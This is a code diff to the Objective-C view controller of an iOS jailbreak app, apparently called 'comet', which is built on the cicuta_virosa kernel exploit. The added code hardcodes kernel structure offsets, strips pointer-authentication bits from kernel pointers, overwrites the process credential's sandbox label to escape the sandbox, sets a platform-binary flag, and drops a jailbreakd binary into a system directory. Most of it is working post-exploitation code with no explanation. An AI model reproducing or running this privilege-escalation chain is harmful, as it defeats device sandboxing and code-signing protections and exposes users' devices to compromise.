@@ -22,7 +22,7 @@
 #import "fake_element_spray.h"
 #import "exploit_utilities.h"
 #import "comet.h"
-#import "fishhook.h"
+
 #import "BypassAntiDebugging.h"
 #import <stdio.h>
 #import <stdlib.h>
@@ -41,52 +41,51 @@
 @interface ViewController ()
 @property (strong, nonatomic) IBOutlet UILabel *ver_stat;
 @property (strong, nonatomic) IBOutlet UIButton *jb_button;
+@property (strong, nonatomic) IBOutlet UITextView *logjb;
 
 
 @end
 
 @implementation ViewController
 -(void)log:(NSString*)log {
-    NSLog(log);
+    _logjb.self.text = [NSString stringWithFormat:@"%@%@", _logjb.self.text, log];
 }
 
-/*#define LOG(what, ...) dispatch_async(dispatch_get_main_queue(), ^{ \
-                           [self log:[NSString stringWithFormat:@what"\n", ##__VA_ARGS__]];\
-                           printf("\t"what"\n", ##__VA_ARGS__);\
-                       })*/
-
 #define LOG(what, ...) [self log:[NSString stringWithFormat:@what"\n", ##__VA_ARGS__]];\
-                        printf("\t"what"\n", ##__VA_ARGS__)
+printf("\t"what"\n", ##__VA_ARGS__)
 
 #define in_bundle(obj) strdup([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@obj] UTF8String])
 
 #define failIf(condition, message, ...) if (condition) {\
-                                            LOG(message);\
-                                            goto end;\
-                                        }
+LOG(message);\
+goto end;\
+}
+
 #define maxVersion(v)  ([[[UIDevice currentDevice] systemVersion] compare:@v options:NSNumericSearch] != NSOrderedDescending)
 
 
 #define fileExists(file) [[NSFileManager defaultManager] fileExistsAtPath:@(file)]
 #define removeFile(file) if (fileExists(file)) {\
-                            [[NSFileManager defaultManager]  removeItemAtPath:@file error:&error]; \
-                            if (error) { \
-                                LOG("[-] Error: removing file %s (%s)", file, [[error localizedDescription] UTF8String]); \
-                                error = NULL; \
-                            }\
-                         }
+[[NSFileManager defaultManager]  removeItemAtPath:@(file) error:&error]; \
+if (error) { \
+LOG("[-] Error: removing file %s (%s)", file, [[error localizedDescription] UTF8String]); \
+error = NULL; \
+}\
+}
 
 #define copyFile(copyFrom, copyTo) [[NSFileManager defaultManager] copyItemAtPath:@(copyFrom) toPath:@(copyTo) error:&error]; \
-                                   if (error) { \
-                                       LOG("[-] Error copying item %s to path %s (%s)", copyFrom, copyTo, [[error localizedDescription] UTF8String]); \
-                                       error = NULL; \
-                                   }
+if (error) { \
+LOG("[-] Error copying item %s to path %s (%s)", copyFrom, copyTo, [[error localizedDescription] UTF8String]); \
+error = NULL; \
+}
 
 #define moveFile(copyFrom, moveTo) [[NSFileManager defaultManager] moveItemAtPath:@(copyFrom) toPath:@(moveTo) error:&error]; \
-                                   if (error) {\
-                                       LOG("[-] Error moviing item %s to path %s (%s)", copyFrom, moveTo, [[error localizedDescription] UTF8String]); \
-                                       error = NULL; \
-                                   }
+if (error) {\
+LOG("[-] Error moviing item %s to path %s (%s)", copyFrom, moveTo, [[error localizedDescription] UTF8String]); \
+error = NULL; \
+}
+
+
 
 - (NSURL *)applicationDocumentsDirectory
 {
@@ -108,20 +107,7 @@
     #endif
     
 }
-int launch(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
-    pid_t pd;
-    const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};
-    
-    int rv = posix_spawn(&pd, binary, NULL, NULL, (char **)&args, env);
-    if (rv) return rv;
-    
-    return 0;
-    
-    //int a = 0;
-    //waitpid(pd, &a, 0);
-    
-    //return WEXITSTATUS(a);
-}
+
 
 
 
@@ -143,27 +129,158 @@ int launch(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *a
     // Obtain a reference to a loadable bundle.
     ucache = [NSBundle bundleWithPath:@"uicache"];
 
-    cicuta_log("...");
-    cicuta_log("..");
+    LOG("...");
+    LOG("..");
     
     sleep(1);
-    cicuta_log("[+] Time to extract our bootstrap...");
+    LOG("[+] Time to extract our bootstrap...");
 
     chmod(in_bundle("uicache"), 0777); //give it proper permissions
    
-    copyFile(in_bundle("uicache"), "/var/mobile/uicache");
+    removeFile("/var/containers/Bundle/iosbinpack64/bin/jailbreakd");
+        if (!fileExists(in_bundle("jailbreakd"))) {
+            chdir(in_bundle(""));
+            
+            
+            
+            
+            
+        }
+        copyFile(in_bundle("jailbreakd"), "/var/containers/Bundle/iosbinpack64/bin/jailbreakd");
+        
     
-    launch("/var/mobile/uicache", NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-   
-  
+}
+
+
+
+static unsigned off_p_pid = 0x68;               // proc_t::p_pid
+static unsigned off_task = 0x10;                // proc_t::task
+static unsigned off_p_uid = 0x30;               // proc_t::p_uid
+static unsigned off_p_gid = 0x34;               // proc_t::p_uid
+static unsigned off_p_ruid = 0x38;              // proc_t::p_uid
+static unsigned off_p_rgid = 0x3c;              // proc_t::p_uid
+static unsigned off_p_ucred = 0xf0;            // proc_t::p_ucred
+static unsigned off_p_csflags = 0x280;          // proc_t::p_csflags
+
+static unsigned off_ucred_cr_uid = 0x18;        // ucred::cr_uid
+static unsigned off_ucred_cr_ruid = 0x1c;       // ucred::cr_ruid
+static unsigned off_ucred_cr_svuid = 0x20;      // ucred::cr_svuid
+static unsigned off_ucred_cr_ngroups = 0x24;    // ucred::cr_ngroups
+static unsigned off_ucred_cr_groups = 0x28;     // ucred::cr_groups
+static unsigned off_ucred_cr_rgid = 0x68;       // ucred::cr_rgid
+static unsigned off_ucred_cr_svgid = 0x6c;      // ucred::cr_svgid
+static unsigned off_ucred_cr_label = 0x78;      // ucred::cr_label
+
+static unsigned off_sandbox_slot = 0x10;
+static unsigned off_t_flags = 0x3a0; // task::t_flags
+
+
+
+
+int launch(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
+pid_t pd;
+const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};
+
+int rv = posix_spawn(&pd, binary, NULL, NULL, (char **)&args, env);
+sleep(1);
+return rv;
+}
+void patch_TF_PLATFORM(uint64_t target_task){
+uint32_t old_t_flags = read_32(target_task + 0xA8);
+old_t_flags |= 0x00000400; // TF_PLATFORM
+write_32(target_task + 0xA8, (void*)old_t_flags);
+
+// used in kernel func: csproc_get_platform_binary
+}
+
+
+
+
++(NSArray*)arrayOfFoldersInFolder:(NSString*) folder {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSArray* files = [fm directoryContentsAtPath:folder];
+    NSMutableArray *directoryList = [NSMutableArray arrayWithCapacity:10];
+ 
+    for(NSString *file in files) {
+        NSString *path = [folder stringByAppendingPathComponent:file];
+        BOOL isDir = NO;
+        [fm fileExistsAtPath:path isDirectory:(&isDir)];
+        if(isDir) {
+            [directoryList addObject:file];
+        }
+    }
+ 
+    return directoryList;
+}
+-(void) installBootstrapAndUnsadbox:(NSString *)data
+{
+
+uint64_t task_pac = cicuta_virosa();
+    LOG("\ntask PAC: 0x%llx\n", task_pac);
+uint64_t task = task_pac | 0xffffff8000000000;
+
+    LOG("PAC decrypt: 0x%llx -> 0x%llx\n", task_pac, task);
+
+uint64_t proc_pac = read_64(task + 0x3A0);
+
+    LOG("proc PAC: 0x%llx\n", proc_pac);
+uint64_t proc = proc_pac | 0xffffff8000000000;
+    LOG("PAC decrypt: 0x%llx -> 0x%llx\n", proc_pac, proc);
+uint64_t ucred_pac = read_64(proc + 0xf0);
+    LOG("ucred PAC: 0x%llx\n", ucred_pac);
+uint64_t ucred = ucred_pac | 0xffffff8000000000;
+    LOG("PAC decrypt: 0x%llx -> 0x%llx\n", ucred_pac, ucred);
+uint32_t buffer[5] = {0, 0, 0, 1, 0};
+
+
+
+uint32_t uid = getuid();
+    LOG("getuid() returns %u\n", uid);
+    LOG("whoami: %s\n", uid == 0 ? "root" : "mobile");
+    LOG("escaping the prison of apple\n");
+uint64_t cr_label_pac = read_64(ucred + 0x78);
+uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
+    LOG("PAC decrypt: 0x%llx -> 0x%llx\n", cr_label_pac, cr_label);
+write_20(cr_label + 0x10, (void*)buffer);
+
+
+[[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/c0met.ini" contents:nil attributes:nil];
+if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/c0met.ini"]){
+    LOG("prison break :)\n");
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSArray* files = [fm directoryContentsAtPath:@"/"];
+    NSMutableArray *directoryList = [NSMutableArray arrayWithCapacity:10];
+ 
+    for(NSString *file in files) {
+        NSString *path = [@"/" stringByAppendingPathComponent:file];
+        BOOL isDir = NO;
+        [fm fileExistsAtPath:path isDirectory:(&isDir)];
+        if(isDir) {
+            [directoryList addObject:file];
+        }
+    }
+    LOG("%s",directoryList);
+    
+//launch("/var/mobile/uicache", 0, 0, 0, 0, 0, 0, 0);
+
+
+
+
+} else {
+    printf("Could not escape the sandbox\n");
+}
+
+sleep(1);
+
+
 }
 - (IBAction)post_exploit:(UIButton *)sender {
   
-    installBootstrapAndUnsadbox(nil);
+    [self installBootstrapAndUnsadbox:@"pump some eggs"];
 
     if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/c0met.ini"]){
-        cicuta_log("...");
-        cicuta_log("yes yes we are in. jailbroken state unless you exit the app");
+        LOG("...");
+        LOG("yes yes we are in. jailbroken state unless you exit the app");
     }
     //this will bypass sandbox
     [self installBin:@"babe we are burning dat today"];
